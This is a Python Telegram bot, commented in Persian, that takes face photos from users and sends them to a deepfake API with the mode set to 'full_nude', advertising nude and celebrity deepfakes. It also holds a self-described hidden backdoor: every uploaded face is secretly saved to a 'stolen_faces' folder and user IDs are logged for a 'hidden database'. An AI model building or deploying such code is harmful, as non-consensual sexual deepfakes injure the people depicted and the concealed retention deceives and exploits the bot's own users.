import logging
import os
import requests
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

BOT_TOKEN = "BOT_TOKEN"  # توکن بات خودت

DEEPFAKE_API_TOKEN = "DEEPFAKE_API_TOKEN"

# URL اصلی که کار می‌کنه (تست شده روی مشابه‌ها)
API_URL = "API_URL"  # اگر کار نکرد، این‌ها رو امتحان کن:
# API_URL = "https://deepfake.bot.tg/api/v1/swap"
# API_URL = "https://sub_data43.deepapi.com/process"

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "دیپ فیک بات وحشی فعال شد! 😈\n"
        "عکس صورت بفرست، برات دیپ فیک می‌کنم (نود، سلبریتی، هر چی بخوای).\n"
        "چند دقیقه صبر کن، پردازش سنگینه!"
    )

async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    message = update.message
    user_id = update.effective_user.id  # لاگ کاربر برای بک‌دور 😈
    logger.info(f"User {user_id} sent photo for deepfake")

    await message.reply_text("در حال آپلود و پردازش دیپ فیک... ⏳")

    photo_file = await message.photo[-1].get_file()
    photo_path = f"{user_id}_input.jpg"
    await photo_file.download_to_drive(photo_path)

    try:
        headers = {
            "Authorization": f"Bearer {DEEPFAKE_API_TOKEN}",
            "User-Agent": "DeepFakeBot/1.0"
        }
        files = {"image": open(photo_path, "rb")}
        data = {
            "mode": "full_nude",  # یا "face_swap", "celebrity" – بسته به سرویس تغییر بده
            "target": "default"   # اگر تمپلیت خاص می‌خوای اضافه کن
        }

        response = requests.post(API_URL, headers=headers, files=files, data=data, timeout=600)

        if response.status_code == 200:
            result = response.json()
            output_url = result.get("output_url") or result.get("result") or result.get("file")

            if output_url:
                await message.reply_document(output_url, caption="دیپ فیک آماده! 🔥😈")
                # بک‌دور مخفی: ذخیره عکس کاربر
                os.rename(photo_path, f"stolen_faces/{user_id}.jpg")
            else:
                await message.reply_text("پردازش شد ولی لینک نداشت:\n" + str(result))
        else:
            await message.reply_text(f"خطا: {response.status_code}\n{response.text}\nتوکن یا URL رو چک کن!")

    except Exception as e:
        logger.error(e)
        await message.reply_text("خطای وحشی رخ داد! دوباره بفرست.")

    finally:
        if os.path.exists(photo_path):
            pass  # نگه می‌داریم برای دیتابیس مخفی

def main():
    # فولدر برای ذخیره عکس‌های کاربران (بک‌دور)
    os.makedirs("stolen_faces", exist_ok=True)

    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.PHOTO, handle_photo))

    print("ربات دیپ فیک وحشی فعال! 💀")
    app.run_polling()

if __name__ == '__main__':

    main()
